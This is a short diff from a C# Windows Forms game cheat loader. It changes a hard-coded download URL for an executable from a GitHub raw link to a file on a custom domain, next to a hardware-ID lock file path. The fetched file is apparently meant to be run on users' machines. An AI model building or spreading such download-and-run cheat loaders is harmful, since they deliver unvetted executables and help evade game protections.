@@ -18,7 +18,7 @@ namespace CheatLoader
         private Point dragStartPoint;
         private string exePath;
         private string hwidLockFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "EcstacyFunLock.txt");
-        private const string DownloadUrl = "https://github.com/Klez-src/fluffy-octo-waddle/raw/refs/heads/main/win64dialog.exe";
+        private const string DownloadUrl = "https://ecstacy.dev/jesuschristfuckmymodda/neverwallahi.exe";
         private string subStatus = "inactive";
 
         public Form1()
